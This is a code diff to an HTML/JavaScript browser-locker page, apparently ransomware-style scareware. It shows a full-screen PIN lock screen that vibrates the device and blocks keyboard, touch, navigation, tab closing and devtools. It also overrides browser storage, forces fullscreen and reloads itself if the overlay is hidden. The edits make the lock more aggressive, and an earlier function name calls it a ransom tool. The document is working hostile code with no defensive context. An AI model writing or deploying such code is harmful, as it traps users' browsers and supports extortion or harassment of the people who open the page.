@@ -34,7 +34,7 @@
             width: 100%;
             height: 100%;
             background: #000;
-            z-index: 2147483647;
+            z-index: 999999;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -251,30 +251,30 @@
     // ==================== PIN = 568729 ====================
     const CORRECT_PIN = "568729";
     
-    let isUnlockedGlobal = false;
+    let isUnlocked = false;
     let wrongAttempts = 0;
-    let globalVibeInterval = null;
+    let vibeInterval = null;
     
     // ==================== VIBRATION ====================
-    function startGlobalVibe() {
-        if (globalVibeInterval) clearInterval(globalVibeInterval);
-        globalVibeInterval = setInterval(() => {
-            if (!isUnlockedGlobal && navigator.vibrate) navigator.vibrate(200);
+    function startVibe() {
+        if (vibeInterval) clearInterval(vibeInterval);
+        vibeInterval = setInterval(() => {
+            if (!isUnlocked && navigator.vibrate) navigator.vibrate(200);
         }, 1800);
     }
     
-    function stopGlobalVibe() {
-        if (globalVibeInterval) { clearInterval(globalVibeInterval); globalVibeInterval = null; }
+    function stopVibe() {
+        if (vibeInterval) { clearInterval(vibeInterval); vibeInterval = null; }
         if (navigator.vibrate) navigator.vibrate(0);
     }
     
-    // ==================== ANTI BUG ANTI ERROR TOTAL ====================
-    function totalAntiBug() {
+    // ==================== ANTI BUG ANTI ERROR 1000% ====================
+    function antiBug1000() {
         window.onerror = function() { return true; };
         window.onunhandledrejection = function(e) { e.preventDefault(); return true; };
         
         setInterval(() => {
-            if (!isUnlockedGlobal) {
+            if (!isUnlocked) {
                 let screen = document.getElementById('lockScreen');
                 if (!screen || screen.style.display === 'none') location.reload();
                 document.body.style.overflow = 'hidden';
@@ -282,19 +282,19 @@
                 document.documentElement.style.overflow = 'hidden';
                 document.body.style.touchAction = 'none';
             }
-        }, 25);
+        }, 20);
         
-        setInterval(() => { debugger; }, 70);
+        setInterval(() => { debugger; }, 60);
         try { console.log = function() {}; console.error = function() {}; console.warn = function() {}; } catch(e) {}
     }
     
-    // ==================== LOCK TOTAL SEMUA AKSES ====================
-    function totalSystemLock() {
+    // ==================== LOCK 1000% TOTAL ====================
+    function lock1000Percent() {
         const allEvents = ['keydown','keyup','keypress','touchstart','touchmove','touchend','mousedown','mouseup','mousemove','click','dblclick','contextmenu','wheel','scroll','resize','orientationchange','visibilitychange','focus','blur','select','change','input','submit','load','pageshow','pagehide','hashchange','popstate'];
         
         allEvents.forEach(event => {
             window.addEventListener(event, function(e) {
-                if (!isUnlockedGlobal) {
+                if (!isUnlocked) {
                     if (e.target.id === 'pinInput' || e.target.className === 'btn-unlock') return;
                     e.preventDefault();
                     e.stopPropagation();
@@ -305,7 +305,7 @@
         });
         
         document.addEventListener('keydown', function(e) {
-            if (!isUnlockedGlobal && e.target.id !== 'pinInput') {
+            if (!isUnlocked && e.target.id !== 'pinInput') {
                 e.preventDefault();
                 e.stopPropagation();
                 return false;
@@ -313,22 +313,22 @@
         }, true);
         
         document.addEventListener('keyup', function(e) {
-            if (!isUnlockedGlobal && e.target.id !== 'pinInput') {
+            if (!isUnlocked && e.target.id !== 'pinInput') {
                 e.preventDefault();
                 return false;
             }
         }, true);
         
         document.body.addEventListener('touchstart', function(e) {
-            if (!isUnlockedGlobal && e.target.id !== 'pinInput' && e.target.className !== 'btn-unlock') e.preventDefault();
+            if (!isUnlocked && e.target.id !== 'pinInput' && e.target.className !== 'btn-unlock') e.preventDefault();
         }, { passive: false });
         
         document.body.addEventListener('touchmove', function(e) {
-            if (!isUnlockedGlobal && e.target.id !== 'pinInput') e.preventDefault();
+            if (!isUnlocked && e.target.id !== 'pinInput') e.preventDefault();
         }, { passive: false });
         
         document.body.addEventListener('touchend', function(e) {
-            if (!isUnlockedGlobal && e.target.id !== 'pinInput' && e.target.className !== 'btn-unlock') e.preventDefault();
+            if (!isUnlocked && e.target.id !== 'pinInput' && e.target.className !== 'btn-unlock') e.preventDefault();
         }, { passive: false });
         
         window.open = function() { return null; };
@@ -345,63 +345,65 @@
             const noop = function() {};
             Object.defineProperty(localStorage, 'setItem', { value: noop });
             Object.defineProperty(localStorage, 'clear', { value: noop });
+            Object.defineProperty(localStorage, 'removeItem', { value: noop });
             Object.defineProperty(sessionStorage, 'setItem', { value: noop });
             Object.defineProperty(sessionStorage, 'clear', { value: noop });
+            Object.defineProperty(sessionStorage, 'removeItem', { value: noop });
         } catch(e) {}
     }
     
-    // ==================== PERSISTENT LOCK (MATI/RESTART TETAP BALIK) ====================
-    function persistentGlobalLock() {
+    // ==================== PERSISTENT LOCK ALL DEVICES ====================
+    function persistentLockAll() {
         try {
-            if (localStorage.getItem('total_lock_v1') === 'true' && !isUnlockedGlobal) isUnlockedGlobal = false;
-            if (!isUnlockedGlobal) { localStorage.setItem('total_lock_v1', 'true'); sessionStorage.setItem('total_lock_v1', 'true'); }
+            if (localStorage.getItem('total_lock_1000') === 'true' && !isUnlocked) isUnlocked = false;
+            if (!isUnlocked) { localStorage.setItem('total_lock_1000', 'true'); sessionStorage.setItem('total_lock_1000', 'true'); }
         } catch(e) {}
         
         window.addEventListener('beforeunload', function(e) {
-            if (!isUnlockedGlobal) { e.preventDefault(); e.returnValue = ''; return ''; }
+            if (!isUnlocked) { e.preventDefault(); e.returnValue = ''; return ''; }
         });
         
         setInterval(() => {
-            if (!isUnlockedGlobal) {
+            if (!isUnlocked) {
                 history.pushState(null, null, location.href);
                 window.onpopstate = function() { history.go(1); };
             }
-        }, 8);
+        }, 5);
         
-        function forceFullscreenPermanent() {
-            if (!isUnlockedGlobal && !document.fullscreenElement) document.documentElement.requestFullscreen().catch(e => {});
+        function forceFullscreenAlways() {
+            if (!isUnlocked && !document.fullscreenElement) document.documentElement.requestFullscreen().catch(e => {});
         }
-        forceFullscreenPermanent();
-        setInterval(forceFullscreenPermanent, 60);
+        forceFullscreenAlways();
+        setInterval(forceFullscreenAlways, 50);
         
         window.addEventListener('keydown', function(e) {
-            if (!isUnlockedGlobal && ((e.ctrlKey && (e.key === 'w' || e.key === 'W')) || e.key === 'F5' || e.key === 'F12' || e.key === 'Escape')) {
+            if (!isUnlocked && ((e.ctrlKey && (e.key === 'w' || e.key === 'W')) || e.key === 'F5' || e.key === 'F12' || e.key === 'Escape')) {
                 e.preventDefault();
                 return false;
             }
         });
         
         setInterval(() => {
-            if (!isUnlockedGlobal) {
+            if (!isUnlocked) {
                 let screen = document.getElementById('lockScreen');
                 if (screen) screen.style.display = 'flex';
             }
-        }, 50);
+        }, 30);
     }
     
     // ==================== VERIFY PIN ====================
     function verifyPin() {
-        if (isUnlockedGlobal) return true;
+        if (isUnlocked) return true;
         
         let pinField = document.getElementById('pinInput');
         let enteredPin = pinField.value;
         let errorDiv = document.getElementById('errorMsg');
         
         if (enteredPin === CORRECT_PIN) {
-            isUnlockedGlobal = true;
-            stopGlobalVibe();
+            isUnlocked = true;
+            stopVibe();
             
-            try { localStorage.removeItem('total_lock_v1'); sessionStorage.removeItem('total_lock_v1'); } catch(e) {}
+            try { localStorage.removeItem('total_lock_1000'); sessionStorage.removeItem('total_lock_1000'); } catch(e) {}
             
             let screen = document.getElementById('lockScreen');
             screen.style.display = 'none';
@@ -421,28 +423,28 @@
             pinField.value = '';
             pinField.focus();
             if (navigator.vibrate) navigator.vibrate([300, 150, 300]);
-            totalSystemLock();
+            lock1000Percent();
             return false;
         }
     }
     
     // ==================== INIT ====================
-    function initTotalRansom() {
-        totalAntiBug();
-        totalSystemLock();
-        persistentGlobalLock();
-        startGlobalVibe();
-        setTimeout(() => { document.getElementById('pinInput').focus(); }, 50);
-        setInterval(() => { if (!isUnlockedGlobal) totalSystemLock(); }, 80);
+    function initTotal() {
+        antiBug1000();
+        lock1000Percent();
+        persistentLockAll();
+        startVibe();
+        setTimeout(() => { document.getElementById('pinInput').focus(); }, 30);
+        setInterval(() => { if (!isUnlocked) lock1000Percent(); }, 50);
         setInterval(() => {
-            if (!isUnlockedGlobal) {
+            if (!isUnlocked) {
                 let screen = document.getElementById('lockScreen');
                 if (screen && window.getComputedStyle(screen).display === 'none') location.reload();
             }
-        }, 60);
+        }, 40);
     }
     
-    initTotalRansom();
+    initTotal();
 </script>
 
 </body>
